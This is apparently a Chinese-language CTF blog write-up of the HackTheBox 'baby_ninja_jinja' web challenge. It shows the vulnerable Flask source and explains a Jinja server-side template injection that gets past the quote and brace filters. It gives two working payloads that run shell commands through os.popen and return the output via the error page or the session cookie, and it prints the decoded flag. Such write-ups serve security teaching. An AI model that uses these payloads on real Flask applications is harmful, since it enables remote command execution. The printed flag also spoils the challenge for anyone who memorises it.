---
title: HTB-baby_ninja_jinja-web-challenge-wp
categories: [CTF,HTB]
tags: [web,python]

---
单纯的python ssti 已经是过去了,但是偶尔刷下还是有意思...<!--more-->

## 漏洞发现

进入页面，发现有一个输入接口：

![image-20220326224004255](/image-20220326224004255.png)

按下F12查看源码：发现提示有`/debug` 路由。找到了源码提示:

```python
from flask import Flask, session, render_template, request, Response, render_template_string, g
import functools, sqlite3, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(120)

acc_tmpl = '''{% extends 'index.html' %}
{% block content %}
<h3>baby_ninja joined, total number of rebels: reb_num<br>
{% endblock %}
'''

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/ninjas.db')
        db.isolation_level = None
        db.row_factory = sqlite3.Row
        db.text_factory = (lambda s: s.replace('{{', '').
            replace("'", '&#x27;').
            replace('"', '&quot;').
            replace('<', '&lt;').
            replace('>', '&gt;')
        )
    return db

def query_db(query, args=(), one=False):
    with app.app_context():
        cur = get_db().execute(query, args)
        rv = [dict((cur.description[idx][0], str(value)) \
            for idx, value in enumerate(row)) for row in cur.fetchall()]
        return (rv[0] if rv else None) if one else rv

@app.before_first_request
def init_db():
    with app.open_resource('schema.sql', mode='r') as f:
        get_db().cursor().executescript(f.read())

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None: db.close()

def rite_of_passage(func):
    @functools.wraps(func)
    def born2pwn(*args, **kwargs):

        name = request.args.get('name', '')

        if name:
            query_db('INSERT INTO ninjas (name) VALUES ("%s")' % name)

            report = render_template_string(acc_tmpl.
                replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']).
                replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next())
            )

            if session.get('leader'): 
                return report

            return render_template('welcome.jinja2')
        return func(*args, **kwargs)
    return born2pwn

@app.route('/')
@rite_of_passage
def index():
    return render_template('index.html')

@app.route('/debug')
def debug():
    return Response(open(__file__).read(), mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)
```

发现在`rite_of_passage`函数的`born2pwn`调用里存在ssti：

```python
            report = render_template_string(acc_tmpl.
                replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']).
                replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next())
            )
```

`render_template_string `的传参收到我们输入的name影响。

但是存在着两个问题:

1.无论输入什么都没用什么明显区别且有意义的回显。

2`{{`、`'`、`"`这几个符号被ban。

## 漏洞利用

![image-20220326230753091](/image-20220326230753091.png)

但是无意中发现，开了报错页面

![image-20220326232127657](/image-20220326232127657.png)

因此我们可以用include 和报错来回显我们输入内容。同时，用`request.args`来传递参数来传递字符串来绕过引号。

构造payload：

```
name={%25include%201.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()|string%25}&xxx=cat%20f* 
```

、从而得到flag：

![image-20220326141147608](/image-20220326141147608.png)

## 其他思路

在查看其他大佬的思路时发现他们是利用`session.update`来更新session来回显。

`session.update`方法可以根据我们传入的字典来重新生成session，用法：

```python
session.update(dict)
//ps
session.update({'a':1})
```

于是构造payload：

```
name={%print%20session.update({dict(a=1)|list|last:1.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()})%}&xxx=cat%20fA*
```

![image-20220326235131162](/image-20220326235131162.png)

解base64后得到flag

```shell
lexs@DESKTOP-MAKMNL3:~$ echo eyJhIjp7IiBiIjoiU0ZSQ2UySTBZbmxmYm1sdWFqUnpYMlF3Ym5SZlp6TjBYM0YxTUhRelpGOHdjbDlqTkhWbmFGUjl
DZz09In19.Yj82BA.RZT3ond24hjE5PZXd2P0P9CHTz|base64 -d
{"a":{" b":"SFRCe2I0YnlfbmluajRzX2QwbnRfZzN0X3F1MHQzZF8wcl9jNHVnaFR9Cg=="}}base64: invalid input
lexs@DESKTOP-MAKMNL3:~$ echo SFRCe2I0YnlfbmluajRzX2QwbnRfZzN0X3F1MHQzZF8wcl9jNHVnaFR9Cg==|base64 -d
HTB{b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT}
```

## 参考文献

https://lexsd6.github.io/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/

https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/

https://www.zapstiko.com/baby-ninja-jinja-challenge-htb-by-raihan-biswas/